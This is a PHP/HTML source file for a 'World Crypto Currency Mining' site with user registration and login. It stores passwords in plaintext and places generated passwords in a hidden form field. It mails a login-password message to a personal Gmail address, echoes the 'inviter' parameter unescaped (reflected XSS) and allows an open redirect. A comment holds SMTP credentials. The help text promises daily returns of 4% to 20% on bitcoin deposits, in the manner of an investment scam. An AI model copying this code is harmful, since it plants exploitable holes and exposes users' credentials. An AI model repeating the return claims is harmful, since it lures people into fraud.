<?php require_once('Connections/conn.php'); ?>
<?php
// *** Validate request to login to this site.
if (!isset($_SESSION)) {
  session_start();
}

  
?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

$currentPage = $_SERVER["PHP_SELF"];

$editFormAction = $_SERVER['PHP_SELF'];
if (isset($_SERVER['QUERY_STRING'])) {
  $editFormAction .= "?" . htmlentities($_SERVER['QUERY_STRING']);
}

if ((isset($_POST["MM_insert"])) && ($_POST["MM_insert"] == "form1")) {
	 $MM_redirectRegSuccess = "after_reg.php";
  $insertSQL = sprintf("INSERT INTO users (fName, lName, email, phone, password, inviter) VALUES (%s, %s, %s, %s, %s, %s)",
                       GetSQLValueString($_POST['fName'], "text"),
                       GetSQLValueString($_POST['lName'], "text"),
                       GetSQLValueString($_POST['email'], "text"),
                       GetSQLValueString($_POST['phone'], "int"),
                       GetSQLValueString($_POST['pass'], "text"),
                       GetSQLValueString($_POST['inviter'], "text"));


 mail('vyonnahphinas@gmail.com', 'WBTC Login Password',$pass, 'From: denniskiprotich0@gmail.com');
/*$email = $_REQUEST['email'] ;
  $message = $_REQUEST['message'];

  // here we use the php mail function
  // to send an email to:
  // you@example.com
  mail( "$email", "Feedback Form Results",$message, "From: denniskiprotich0@gmail.com" );
  
  

require("PHPMailer_5.2.0/class.PHPMailer.php");

$mail = new PHPMailer();

$mail->IsSMTP();                                      // set mailer to use SMTP
$mail->Host = "mail.google.com;mail2.example.com";  // specify main and backup server
$mail->SMTPAuth = true;     // turn on SMTP authentication
$mail->Username = "dennoh";  // SMTP username
$mail->Password = "dennoh"; // SMTP password

$mail->From = "denniskiprotich0@gmail.com";
$mail->FromName = "Mailer";
$mail->AddAddress("denniskiprotich0@gmail.com", "Dennis Ngetich");
$mail->AddAddress("denniskiprotich0@gmail.com");                  // name is optional
$mail->AddReplyTo("denniskiprotich0@gmail.com", "User Information WBTC");

$mail->WordWrap = 50;                                 // set word wrap to 50 characters
$mail->AddAttachment("");         // add attachments
$mail->AddAttachment("", "");    // optional name
$mail->IsHTML(true);                                  // set email format to HTML

$mail->Subject = "Login credentials";
$mail->Body    = "Your password is $pass" ;
$mail->AltBody = "Your password is .$pass.";

if(!$mail->Send())
{
   echo "Message could not be sent. 
";
   echo "Mailer Error: " . $mail->ErrorInfo;
   exit;
}

echo "Message has been sent";*/
  mysql_select_db($database_conn, $conn);
  $Result1 = mysql_query($insertSQL, $conn) or die(mysql_error());
  if($Result1){header("Location:".$MM_redirectRegSuccess);
   mail('vyonnahphinas@gmail.com','test mail','My mail','From: denniskiprotich0@gmail.com');}
}

$maxRows_userdets = 10;
$pageNum_userdets = 0;
if (isset($_GET['pageNum_userdets'])) {
  $pageNum_userdets = $_GET['pageNum_userdets'];
}
$startRow_userdets = $pageNum_userdets * $maxRows_userdets;

mysql_select_db($database_conn, $conn);
$query_userdets = "SELECT * FROM users";
$query_limit_userdets = sprintf("%s LIMIT %d, %d", $query_userdets, $startRow_userdets, $maxRows_userdets);
$userdets = mysql_query($query_limit_userdets, $conn) or die(mysql_error());
$row_userdets = mysql_fetch_assoc($userdets);

if (isset($_GET['totalRows_userdets'])) {
  $totalRows_userdets = $_GET['totalRows_userdets'];
} else {
  $all_userdets = mysql_query($query_userdets);
  $totalRows_userdets = mysql_num_rows($all_userdets);
}
$totalPages_userdets = ceil($totalRows_userdets/$maxRows_userdets)-1;

$queryString_userdets = "";
if (!empty($_SERVER['QUERY_STRING'])) {
  $params = explode("&", $_SERVER['QUERY_STRING']);
  $newParams = array();
  foreach ($params as $param) {
    if (stristr($param, "pageNum_userdets") == false && 
        stristr($param, "totalRows_userdets") == false) {
      array_push($newParams, $param);
    }
  }
  if (count($newParams) != 0) {
    $queryString_userdets = "&" . htmlentities(implode("&", $newParams));
  }
}
$queryString_userdets = sprintf("&totalRows_userdets=%d%s", $totalRows_userdets, $queryString_userdets);
?>
<?php
// *** Validate request to login to this site.
if (!isset($_SESSION)) {
  session_start();
}

$loginFormAction = $_SERVER['PHP_SELF'];
if (isset($_GET['accesscheck'])) {
  $_SESSION['PrevUrl'] = $_GET['accesscheck'];
}

if (isset($_POST['email'])) {

  $loginUsername=$_POST['email'];
  $password=$_POST['password'];
  $MM_fldUserAuthorization = "accessLevel";
  $MM_redirectLoginSuccess1 = "home.php";
$MM_redirectLoginSuccess = "admin/index.php";
  $MM_redirectLoginFailed = "index.php#account";
  $MM_redirecttoReferrer = true;
  mysql_select_db($database_conn, $conn);
  	
  $LoginRS__query=sprintf("SELECT email,  password, accessLevel FROM users WHERE BINARY email=%s AND BINARY password=%s",
  GetSQLValueString($loginUsername, "text"), GetSQLValueString($password, "text")); 
   
  $LoginRS = mysql_query($LoginRS__query, $conn) or die(mysql_error());
  $loginFoundUser = mysql_num_rows($LoginRS);
  if ($loginFoundUser) {

      $loginStrGroup = mysql_result($LoginRS, 0, 'accessLevel');

      if (PHP_VERSION >= 5.1) {
          session_regenerate_id(true);
      } else {
          session_regenerate_id();
      }
      //declare two session variables and assign them
      $_SESSION['MM_Username'] = $loginUsername;
      $_SESSION['MM_UserGroup'] = $loginStrGroup;
	  $_SESSION['MM-Password']=$password;
      if (isset($_SESSION['PrevUrl']) && true) {
          $MM_redirectLoginSuccess = $_SESSION['PrevUrl'];
      }
      if ($loginStrGroup == 'Admin') {
          header("Location: " . $MM_redirectLoginSuccess);
      } else if ($loginStrGroup == 'User') {
          header("Location: " . $MM_redirectLoginSuccess1);
      } else {
          header("Location: " . $MM_redirectLoginFailed);
      }
  }
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>World Crypto Currency Mining</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="fluid.css">
<link rel="stylesheet" href="styles.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
<link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link href="SpryAssets/SpryCollapsiblePanel.css" rel="stylesheet" type="text/css" />
<script src="SpryAssets/SpryCollapsiblePanel.js" type="text/javascript"></script>
<body><center>
<div id="navbar" class="linav">
<ul><li><a href="home.php" id="linkref">Home</a></li>
<li><a href="#account" id="linkref">Login/Register</a></li>
<li><a href="#help" id="linkref">Help</a></li>
<li style="color:#09f">
<?php error_reporting(0); if ($_SESSION['MM_Username']=="") {print '<a href="index.php#account" id="linkref">Login</a>';}
  else {echo "Logged in as: "; echo $_SESSION['MM_Username']; print '<a href="logout.php" id="linkref"> Logout</a>';}?>
 </li></ul>
</div>
<div class="container">
<img src="images/photo-1505473478993-e61136811cc4.jpg" width="100%"/>
<div class="center"><div class="textImg"><h1>Welcome To World Crypto Currency Mining</h1>
	<br /></div>
    	<a href="" class="linkimg">Home Page</a></div></div>
        <a name="account">
        <div id="account">

<h2>Register or Login</h2>
  <div id="CollapsiblePanel1" class="CollapsiblePanel">
    <div class="CollapsiblePanelTab" tabindex="0">Login to start investment</div>
    <div class="CollapsiblePanelContent"><form action="<?php echo $loginFormAction; ?>" method="POST" name="f1">
    <table align="center">
 

<tr>
    <td>Email:</td>
    <td> <input type="email" name="email" size=32" /> </td>
  </tr>
  <tr>
    <td>Password:</td>
    <td><input type="password" name="password" size="32"/></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td><input type="submit" value="Login"  /></td>
  </tr>
</table></form>
</div>
      <div class="CollapsiblePanelTab" tabindex="1">Create new account</div>
      <div class="CollapsiblePanelContent">
        <form action="<?php echo $editFormAction; ?>" method="post" name="form1" id="form1">
          <table align="center">
            <tr valign="baseline">
              <td nowrap="nowrap" align="right">FName:</td>
              <td><input type="text" name="fName" value="" size="32" /></td>
            </tr>
            <tr valign="baseline">
              <td nowrap="nowrap" align="right">LName:</td>
              <td><input type="text" name="lName" value="" size="32" /></td>
            </tr>
            <tr valign="baseline">
              <td nowrap="nowrap" align="right">Email:</td>
              <td><input type="email" name="email" id="email" value="" size="32" /></td>
            </tr>
            <tr valign="baseline">
              <td nowrap="nowrap" align="right">Phone:</td>
              <td><input type="text" name="phone" value="" size="32" /></td>
            </tr>
              <tr valign="baseline">
                  <td nowrap="nowrap" align="right">Inviter:</td>
                  <td><input type="text" name="inviter" value="<?php if (isset($_GET['inviter'])) {
  echo $_GET['inviter'];
} ?>" size="32" /></td>
              </tr>
             <tr valign="baseline">
              <td nowrap="nowrap" align="right">&nbsp;</td>
              <td><input type="submit" value="Create Account" /></td>
            </tr>
           
          </table><input type="hidden" name="pass" value="<?php
echo substr(md5(mt_rand(10,10000)),24);
?>" size="32" />
<input type="hidden" name="message" id="message" value="Your password is $pass" />
          <input type="hidden" name="MM_insert" value="form1" />
        </form>
        <p>&nbsp;</p>
      </div>
    </div>
    
  </div></center>
       
<a name="help>"><div id="help"><h2>Help Section</h2>
        <p>World Crypto Currency Mining is a bitcoin mining pool that was started mid 2017 by a group of crypto-currency partners aimed at creating
            a reasonable mining pool for all bitcoin miners arround the globe</p>
        <p>It offers its clients a profitable mining  of daily 4%, 7% and 15% interest on bitcoins worth
            $40, $150, $500 deposited respectively. Any amount above the quoted earns a daily profit of 20%. </p>  <p>World Crypto Currency Mining is a bitcoin mining pool that was started mid 2017 by a group of crypto-currency partners aimed at creating
            a reasonable mining pool for all bitcoin miners arround the globe</p>
        <p>It offers its clients a profitable mining  of daily 4%, 7% and 15% interest on bitcoins worth
            $40, $150, $500 deposited respectively. Any amount above the quoted earns a daily profit of 20%. </p>  <p>World Crypto Currency Mining is a bitcoin mining pool that was started mid 2017 by a group of crypto-currency partners aimed at creating
            a reasonable mining pool for all bitcoin miners arround the globe</p>
        <p>It offers its clients a profitable mining  of daily 4%, 7% and 15% interest on bitcoins worth
            $40, $150, $500 deposited respectively. Any amount above the quoted earns a daily profit of 20%. </p>  <p>World Crypto Currency Mining is a bitcoin mining pool that was started mid 2017 by a group of crypto-currency partners aimed at creating
            a reasonable mining pool for all bitcoin miners arround the globe</p>
        <p>It offers its clients a profitable mining  of daily 4%, 7% and 15% interest on bitcoins worth
            $40, $150, $500 deposited respectively. Any amount above the quoted earns a daily profit of 20%. </p>

<script type="text/javascript">
var CollapsiblePanel1 = new Spry.Widget.CollapsiblePanel("CollapsiblePanel1");
</script>
</body>
</html>
<?php
mysql_free_result($userdets);
?>
